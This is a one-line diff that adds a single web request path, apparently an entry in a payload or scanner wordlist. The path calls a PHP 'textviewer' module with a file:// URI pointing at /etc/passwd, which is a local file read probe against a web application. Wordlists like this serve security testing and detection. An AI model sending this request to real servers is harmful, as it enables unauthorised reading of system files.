@@ -1,0 +1,1 @@
+/index.php?mod=textviewer&src=file:///etc/passwd
